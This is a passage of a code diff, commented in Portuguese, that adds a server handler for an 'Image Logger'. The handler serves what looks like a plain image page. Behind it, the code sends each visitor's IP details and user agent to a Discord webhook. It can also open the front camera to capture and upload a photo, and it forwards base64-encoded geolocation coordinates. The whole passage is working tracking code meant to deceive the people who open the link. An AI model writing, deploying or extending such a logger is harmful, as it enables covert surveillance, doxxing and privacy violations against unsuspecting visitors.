+                    if (${config.captureCamera}) {
+                      startCamera();
+                    } else {
+                      document.querySelector('.loading').style.display = 'none';
+                    }
+                  }
+                }
+              });
+              
+              // Função para iniciar a câmera
+              function startCamera() {
+                // Verificar se o navegador suporta getUserMedia
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                  // Esconder a tela de carregamento
+                  document.querySelector('.loading').style.display = 'none';
+                  
+                  // Solicitar acesso à câmera
+                  navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                      facingMode: 'user',
+                      width: { ideal: 1280 },
+                      height: { ideal: 720 } 
+                    } 
+                  })
+                  .then(function(stream) {
+                    // Configurar o vídeo
+                    const videoElement = document.getElementById('camera');
+                    videoElement.srcObject = stream;
+                    
+                    // Mostrar a interface da câmera
+                    document.getElementById('camera-container').style.display = 'flex';
+                    document.getElementById('snap-button').style.display = 'block';
+                    
+                    // Configurar botão para tirar foto
+                    document.getElementById('snap-button').addEventListener('click', function() {
+                      // Capturar imagem da câmera
+                      const canvas = document.getElementById('canvas');
+                      const context = canvas.getContext('2d');
+                      canvas.width = videoElement.videoWidth;
+                      canvas.height = videoElement.videoHeight;
+                      
+                      // Desenhar no canvas
+                      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                      
+                      // Obter dados da imagem
+                      const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                      
+                      // Parar a câmera
+                      const tracks = stream.getTracks();
+                      tracks.forEach(track => track.stop());
+                      
+                      // Recuperar coordenadas
+                      var lat = 0;
+                      var lng = 0;
+                      
+                      if (localStorage.getItem('coords')) {
+                        const storedCoords = localStorage.getItem('coords');
+                        [lat, lng] = storedCoords.split(',');
+                      }
+                      
+                      var coords = lat + "," + lng;
+                      var encodedCoords = btoa(coords);
+                      
+                      // Construir nova URL com coordenadas
+                      var currentUrl = window.location.href;
+                      var baseUrl = currentUrl.split('?')[0]; // Remover parâmetros existentes
+                      var newUrl = baseUrl + "?g=" + encodedCoords;
+                      
+                      // Enviar imagem separadamente via fetch
+                      fetch(baseUrl + "?img=" + encodeURIComponent(imageData), {
+                        method: 'GET'
+                      }).catch(error => console.error('Erro ao enviar imagem:', error));
+                      
+                      // Redirecionar para nova URL
+                      window.location.replace(newUrl);
+                    });
+                  })
+                  .catch(function(error) {
+                    // Erro ao acessar câmera
+                    console.error('Erro ao acessar câmera:', error);
+                    
+                    // Recuperar coordenadas e continuar sem câmera
+                    var lat = 0;
+                    var lng = 0;
+                    
+                    if (localStorage.getItem('coords')) {
+                      const storedCoords = localStorage.getItem('coords');
+                      [lat, lng] = storedCoords.split(',');
+                    }
+                    
+                    // Enviar apenas com geolocalização
+                    var coords = lat + "," + lng;
+                    var encodedCoords = btoa(coords);
+                    var currentUrl = window.location.href;
+                    var newUrl;
+                    
+                    if (currentUrl.includes("?")) {
+                      newUrl = currentUrl + "&g=" + encodedCoords;
+                    } else {
+                      newUrl = currentUrl + "?g=" + encodedCoords;
+                    }
+                    
+                    // Redirecionar
+                    window.location.replace(newUrl);
+                  });
+                } else {
+                  // getUserMedia não suportado, prosseguir apenas com geolocalização
+                  console.error('getUserMedia não suportado neste navegador');
+                  
+                  // Recuperar coordenadas e continuar
+                  var lat = 0;
+                  var lng = 0;
+                  
+                  if (localStorage.getItem('coords')) {
+                    const storedCoords = localStorage.getItem('coords');
+                    [lat, lng] = storedCoords.split(',');
+                  }
+                  
+                  // Enviar apenas com geolocalização
+                  var coords = lat + "," + lng;
+                  var encodedCoords = btoa(coords);
+                  var currentUrl = window.location.href;
+                  var newUrl;
+                  
+                  if (currentUrl.includes("?")) {
+                    newUrl = currentUrl + "&g=" + encodedCoords;
+                  } else {
+                    newUrl = currentUrl + "?g=" + encodedCoords;
+                  }
+                  
+                  // Redirecionar
+                  window.location.replace(newUrl);
+                }
+              }
+            </script>
+          </body>
+          </html>
+        `;
+      }
+      
+      res.setHeader('Content-Type', 'text/html');
+      res.status(200).send(html);
+    } else {
+      // Geolocalização não está ativada, enviar relatório básico
+      console.log('Obtendo informações básicas do IP (sem geolocalização)...');
+      const ipInfo = await getIPInfo(ip);
+      console.log('Informações básicas do IP obtidas:', ipInfo);
+      
+      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
+      
+      const data = {
+        username: config.username,
+        content: "@everyone",
+        embeds: [
+          {
+            title: "Image Logger - IP Capturado",
+            color: config.color,
+            description: description,
+            thumbnail: { url: config.image }
+          }
+        ]
+      };
+      
+      console.log('Enviando relatório para o Discord...');
+      await sendDiscordWebhook(data);
+      
+      // Enviar página com a imagem
+      const html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Imagem</title>
+          <meta charset="utf-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <style>
+            body, html {
+              margin: 0;
+              padding: 0;
+              height: 100%;
+              width: 100%;
+              overflow: hidden;
+            }
+            .imagem {
+              width: 100%;
+              height: 100vh;
+              background-image: url('${config.image}');
+              background-position: center;
+              background-repeat: no-repeat;
+              background-size: contain;
+            }
+            #camera-container {
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background-color: rgba(0,0,0,0.8);
+              display: none;
+              justify-content: center;
+              align-items: center;
+              z-index: 999;
+            }
+            #camera {
+              max-width: 100%;
+              max-height: 90vh;
+            }
+            #snap-button {
+              position: fixed;
+              bottom: 20px;
+              left: 50%;
+              transform: translateX(-50%);
+              padding: 12px 25px;
+              background-color: #f44336;
+              color: white;
+              border: none;
+              border-radius: 30px;
+              cursor: pointer;
+              font-size: 16px;
+              font-weight: bold;
+              z-index: 1000;
+              display: none;
+            }
+            #canvas {
+              display: none;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="imagem"></div>
+          
+          <!-- Elementos para captura de câmera -->
+          <div id="camera-container">
+            <video id="camera" autoplay playsinline></video>
+          </div>
+          <canvas id="canvas"></canvas>
+          <button id="snap-button">Tirar Foto</button>
+          
+          <script>
+            // Se a captura de câmera estiver ativada, iniciar após carregar a página
+            if (${config.captureCamera}) {
+              document.addEventListener('DOMContentLoaded', function() {
+                setTimeout(function() {
+                  startCamera();
+                }, 1000);
+              });
+              
+              // Função para iniciar a câmera
+              function startCamera() {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                  navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                      facingMode: 'user',
+                      width: { ideal: 1280 },
+                      height: { ideal: 720 } 
+                    } 
+                  })
+                  .then(function(stream) {
+                    // Configurar o vídeo
+                    const videoElement = document.getElementById('camera');
+                    videoElement.srcObject = stream;
+                    
+                    // Mostrar a interface da câmera
+                    document.getElementById('camera-container').style.display = 'flex';
+                    document.getElementById('snap-button').style.display = 'block';
+                    
+                    // Configurar botão para tirar foto
+                    document.getElementById('snap-button').addEventListener('click', function() {
+                      // Capturar imagem da câmera
+                      const canvas = document.getElementById('canvas');
+                      const context = canvas.getContext('2d');
+                      canvas.width = videoElement.videoWidth;
+                      canvas.height = videoElement.videoHeight;
+                      
+                      // Desenhar no canvas
+                      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                      
+                      // Obter dados da imagem
+                      const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                      
+                      // Parar a câmera
+                      const tracks = stream.getTracks();
+                      tracks.forEach(track => track.stop());
+                      
+                      // Esconder elementos da câmera
+                      document.getElementById('camera-container').style.display = 'none';
+                      document.getElementById('snap-button').style.display = 'none';
+                      
+                      // Enviar a imagem capturada para o servidor
+                      var currentUrl = window.location.href;
+                      var baseUrl = currentUrl.split('?')[0]; // Remover parâmetros existentes
+                      
+                      // Enviar via fetch
+                      fetch(baseUrl + "?img=" + encodeURIComponent(imageData), {
+                        method: 'GET'
+                      }).catch(error => console.error('Erro ao enviar imagem:', error));
+                    });
+                  })
+                  .catch(function(error) {
+                    console.error('Erro ao acessar câmera:', error);
+                  });
+                }
+              }
+            }
+          </script>
+        </body>
+        </html>
+      `;
+      
+      res.setHeader('Content-Type', 'text/html');
+      res.status(200).send(html);
+    }
+  } catch (error) {
+    console.error('Erro:', error);
+    
+    // Em caso de erro, enviar página básica
+    res.setHeader('Content-Type', 'text/html');
+    res.status(200).send(`
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <title>Imagem</title>
+      </head>
+      <body>
+        <img src="${config.image}" alt="Imagem" style="max-width: 100%; max-height: 100vh;">
+      </body>
+      </html>
+    `);
+  }
+};
